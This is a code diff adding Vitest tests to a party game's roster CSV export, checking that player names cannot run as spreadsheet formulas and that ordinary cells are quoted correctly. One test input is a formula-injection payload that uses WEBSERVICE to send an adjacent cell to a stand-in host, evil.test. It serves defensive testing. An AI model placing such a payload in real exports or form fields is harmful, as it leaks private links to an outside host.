@@ -1,5 +1,5 @@
 import { describe, expect, it } from 'vitest';
-import { createInviteExport, parseRosterCsv } from './csv';
+import { createInviteExport, csvCell, parseRosterCsv } from './csv';
 
 function validCsv(count = 20): string {
   return [
@@ -82,5 +82,19 @@ describe('roster CSV', () => {
     expect(csv).toContain('Maya Chen');
     expect(csv).toContain('ABC123');
     expect(csv).not.toMatch(/"role"|"WEREWOLF"|"SEER"|"BODYGUARD"|"DOCTOR"|"HUNTER"|"MASON"/u);
+  });
+  // A name typed on the public sign-up form lands in a file that is opened in a spreadsheet beside private links.
+  it.each(['=WEBSERVICE("http://evil.test/?"&C2)', '+SUM(A1)', '-2+3', '@SUM(A1)', '\tcmd', '\rcmd'])('shows %j in a spreadsheet as text, never as a formula', (name) => {
+    expect(csvCell(name).startsWith(`"'`)).toBe(true);
+    const csv = createInviteExport([{ displayName: name, email: 'a@example.com', claimUrl: 'https://game.test/claim/abc', inviteCode: 'ABC123' }]);
+    const [, row] = csv.split('\r\n');
+    expect(row.startsWith(`"'`)).toBe(true);
+  });
+
+  it('leaves ordinary cells exactly as they were and still doubles quotes', () => {
+    expect(csvCell('Maya Chen')).toBe('"Maya Chen"');
+    expect(csvCell('Sean "Mac" O\'Brien')).toBe('"Sean ""Mac"" O\'Brien"');
+    expect(csvCell('https://game.test/claim/abc')).toBe('"https://game.test/claim/abc"');
+    expect(csvCell('')).toBe('""');
   });
 });
